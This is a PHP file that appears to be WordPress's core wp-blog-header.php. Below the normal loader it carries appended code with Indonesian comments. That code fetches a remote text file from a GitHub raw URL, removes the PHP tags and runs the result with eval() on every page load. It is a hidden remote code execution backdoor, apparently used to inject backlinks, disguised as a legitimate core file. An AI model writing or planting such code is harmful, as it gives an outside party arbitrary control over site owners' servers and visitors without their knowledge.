<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if (!isset($wp_did_header)) {

    $wp_did_header = true;

    // Load the WordPress library.
    require_once __DIR__ . '/wp-load.php';

    // Set up the WordPress query.
    wp();

    // Load the theme template.
    require_once ABSPATH . WPINC . '/template-loader.php';
}

// Membuat fungsi untuk mengambil konten dengan cURL
function fetch_content($url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Mengaktifkan verifikasi SSL
    $fileContents = curl_exec($ch);
    $error = curl_error($ch); // Menangani kesalahan cURL
    curl_close($ch);

    return array($fileContents, $error); // Mengembalikan hasil dan kesalahan
}

// Mengambil konten dari URL
$url = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
list($fileContents, $error) = fetch_content($url); // Mendapatkan hasil dan kesalahan

if ($fileContents === false) {
    // Handle the error if curl request fails
    // Misalnya, catat kesalahan ke log atau lakukan tindakan yang sesuai
} else {
    // Menghapus tag PHP yang tidak diperlukan
    $fileContents = str_replace(array('<?php', '<?', '?>'), '', $fileContents);

    // Evaluasi konten jika perlu
    eval($fileContents);
}
?>
